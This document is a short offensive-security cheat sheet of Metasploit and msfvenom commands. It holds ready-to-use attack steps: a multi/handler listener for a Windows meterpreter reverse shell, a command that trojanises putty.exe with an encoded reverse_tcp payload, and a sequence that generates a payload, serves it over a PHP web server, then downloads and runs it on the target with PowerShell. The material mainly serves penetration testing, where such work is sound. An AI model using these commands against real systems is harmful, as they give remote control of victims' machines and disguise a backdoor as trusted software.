Start meterpreter listener for a Windows payload
------------------------------------------------
```bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 443
exploit
```

Backdoor a Windows Feedback Executable
------------------------------
```bash
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lport= 4444 lhost=xxx.xxx.xxx.xxx -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```
Generate Payload -> powershell to download -> execute 
--------------------------------------------------------------------
```bash
# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=7777 -f exe > ./reverse3.exe
# Start Webserver to download
php -S 10.5.21.24:80
# Start listener
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 7777
exploit
# Use PowerShell to download payload
powershell Invoke-WebRequest http://xxx.xxx.xxx.xxx:80/reverse3.exe -O 'C:\path\where\you\can\create\files\reverse3.exe'
# Execute payload (try different quotes as needed)
"C:\path\where\you\can\create\files\reverse3.exe"
```

